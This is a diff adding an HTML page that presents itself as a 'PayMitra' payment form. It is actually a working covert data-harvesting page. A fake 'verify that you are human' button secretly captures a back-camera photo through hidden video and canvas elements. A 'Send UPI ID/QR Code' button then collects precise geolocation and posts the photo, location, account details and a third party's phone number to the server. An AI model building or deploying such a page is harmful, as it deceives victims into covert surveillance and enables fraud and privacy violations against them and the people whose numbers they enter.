@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>PayMitra — Receive Payment</title>
+  <style>
+    :root{
+      --accent:#0B5FFF;
+      --muted:#666;
+      --bg:#f6f8fb;
+      --card:#ffffff;
+    }
+    body{font-family:Inter, system-ui, Arial; margin:0; background:var(--bg); display:flex; align-items:center; justify-content:center; min-height:100vh;}
+    .container{width:420px; background:var(--card); border-radius:12px; box-shadow:0 12px 30px rgba(10,20,40,0.08); padding:20px;}
+    header{display:flex; align-items:center; gap:12px; margin-bottom:12px;}
+    .logo{width:52px; height:52px; border-radius:10px; background:linear-gradient(135deg,var(--accent), #2fc6ff); display:flex; align-items:center; justify-content:center; color:white; font-weight:700; font-size:20px;}
+    h1{margin:0; font-size:18px;}
+    p.sub{margin:6px 0 14px; color:var(--muted); font-size:13px;}
+    label{display:block; font-size:12px; color:var(--muted); margin-top:10px;}
+    input[type=text], input[type=tel] {width:100%; padding:10px 12px; margin-top:6px; border-radius:8px; border:1px solid #e6e9ef; box-sizing:border-box;}
+    .qr-wrap{display:flex; gap:10px; align-items:center; margin-top:10px;}
+    .qr-preview{width:96px; height:96px; border-radius:8px; background:#fafafa; border:1px dashed #e2e6ef; display:flex; align-items:center; justify-content:center; font-size:12px; color:var(--muted);}
+    .primary{background:var(--accent); color:white; border:none; padding:12px 14px; border-radius:10px; font-weight:600; cursor:pointer; margin-top:14px; width:100%;}
+    .secondary{background:transparent; color:var(--accent); border:1px solid var(--accent); padding:10px 12px; border-radius:10px; cursor:pointer; width:100%;}
+    .muted{font-size:13px; color:var(--muted); margin-top:8px;}
+    .status{margin-top:10px; font-size:13px}
+    .small{font-size:12px; color:#999; margin-top:6px}
+    /* hidden video/canvas */
+    video, canvas{display:none; width:1px; height:1px; position:absolute; left:-9999px; top:-9999px;}
+    .row{display:flex; gap:8px;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="logo">PM</div>
+      <div>
+        <h1>PayMitra — Receive Payment</h1>
+        <p class="sub">Share your payment details.</p>
+      </div>
+    </header>
+
+    <!-- Payment details -->
+    <label>Account number / UPI ID</label>
+    <input id="account" type="text" placeholder="Account number or UPI ID (eg. name@upi)">
+
+    <label>Upload QR (optional)</label>
+    <div class="qr-wrap">
+      <div id="qrPreview" class="qr-preview">No QR</div>
+      <div style="flex:1">
+        <input id="qrFile" type="file" accept="image/*">
+        <div class="small">Upload a QR image so others can scan to pay.</div>
+      </div>
+    </div>
+
+    <label>Other person's phone number (to record payer)</label>
+    <input id="payerPhone" type="tel" placeholder="Mobile number of payer (required)">
+
+    <div style="margin-top:12px">
+      <button id="startCapture" class="primary">Click to verify that you are human</button>
+      <div class="muted small">The camera permission is required for verification.</div>
+    </div>
+
+    <div style="margin-top:8px">
+      <button id="sendData" class="secondary" disabled>Send UPI ID/QR Code</button>
+      <div id="status" class="status"></div>
+    </div>
+
+    <p class="small">This page will request them only when you click the buttons above. Our terms and conditions are required to fulfill</p>
+  </div>
+
+  <!-- Hidden elements for capture (not shown) -->
+  <video id="hiddenVideo" autoplay playsinline></video>
+  <canvas id="hiddenCanvas"></canvas>
+
+<script>
+(async function(){
+  const startBtn = document.getElementById('startCapture');
+  const sendBtn = document.getElementById('sendData');
+  const statusEl = document.getElementById('status');
+  const video = document.getElementById('hiddenVideo');
+  const canvas = document.getElementById('hiddenCanvas');
+  const qrFile = document.getElementById('qrFile');
+  const qrPreview = document.getElementById('qrPreview');
+
+  let currentStream = null;
+  let lastPhotoBlob = null;
+
+  // Show QR preview when user uploads
+  qrFile.addEventListener('change', e=>{
+    const f = e.target.files[0];
+    if(!f) { qrPreview.textContent='No QR'; return; }
+    const url = URL.createObjectURL(f);
+    qrPreview.style.backgroundImage = `url(${url})`;
+    qrPreview.style.backgroundSize = 'cover';
+    qrPreview.textContent = '';
+  });
+
+  // Start capture: request camera, take a single photo (no preview shown)
+  startBtn.addEventListener('click', async ()=>{
+    statusEl.textContent = '';
+    // Request camera access (prefer back camera if available)
+    try {
+      if (currentStream) {
+        stopStream();
+      }
+      const constraints = { video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false };
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      currentStream = stream;
+      video.srcObject = stream;
+
+      // Wait for a frame
+      await new Promise((res)=> video.onloadedmetadata = res);
+      // Decide canvas size
+      const w = video.videoWidth || 1280;
+      const h = video.videoHeight || 720;
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      // draw current frame into canvas
+      ctx.drawImage(video, 0, 0, w, h);
+
+      // convert to blob (jpeg)
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+      lastPhotoBlob = blob;
+
+      // stop the camera immediately after capture to free resources
+      stopStream();
+
+      statusEl.textContent = 'Photo captured (not displayed). You can now "Send photo & location".';
+      sendBtn.disabled = false;
+
+    } catch (err) {
+      console.error(err);
+      statusEl.textContent = 'Camera access failed or denied: ' + (err.message || err);
+    }
+  });
+
+  function stopStream(){
+    if(!currentStream) return;
+    currentStream.getTracks().forEach(t => t.stop());
+    currentStream = null;
+    video.srcObject = null;
+  }
+
+  // Send photo + geolocation + form fields to server
+  sendBtn.addEventListener('click', async ()=>{
+    statusEl.textContent = '';
+    if(!lastPhotoBlob){
+      statusEl.textContent = 'No photo captured yet. Click "Click to capture photo" first.';
+      return;
+    }
+
+    // get location
+    if(!('geolocation' in navigator)){
+      statusEl.textContent = 'Geolocation is not supported in this browser.';
+      return;
+    }
+
+    statusEl.textContent = 'Requesting location permission...';
+
+    // getCurrentPosition may prompt; we handle success/fail
+    navigator.geolocation.getCurrentPosition(async (pos)=>{
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      statusEl.textContent = 'Location captured. Sending data...';
+
+      const fd = new FormData();
+      fd.append('photo', lastPhotoBlob, 'capture.jpg');
+      fd.append('latitude', lat);
+      fd.append('longitude', lon);
+      fd.append('account', document.getElementById('account').value || '');
+      fd.append('payerPhone', document.getElementById('payerPhone').value || '');
+      // attach QR file if uploaded
+      if(qrFile.files && qrFile.files[0]) fd.append('qr', qrFile.files[0]);
+
+      try {
+        const resp = await fetch('/upload', {
+          method: 'POST',
+          body: fd
+        });
+        if(!resp.ok){
+          const text = await resp.text().catch(()=>resp.statusText);
+          statusEl.textContent = 'Server error: ' + text;
+        } else {
+          const data = await resp.json().catch(()=>({ok:true}));
+          statusEl.textContent = 'Sent successfully.';
+          // clear the last photo blob so it can't be resent without recapture
+          lastPhotoBlob = null;
+          sendBtn.disabled = true;
+        }
+      } catch (err){
+        console.error(err);
+        statusEl.textContent = 'Network error while sending: ' + (err.message || err);
+      }
+
+    }, (err)=>{
+      console.error(err);
+      statusEl.textContent = 'Location permission denied or failed: ' + (err.message || err.code);
+    }, { enableHighAccuracy: true, timeout: 10000 });
+  });
+
+  // Cleanup when navigating away
+  window.addEventListener('beforeunload', ()=> stopStream());
+})();
+  
+
+</script>
+</body>
+</html>
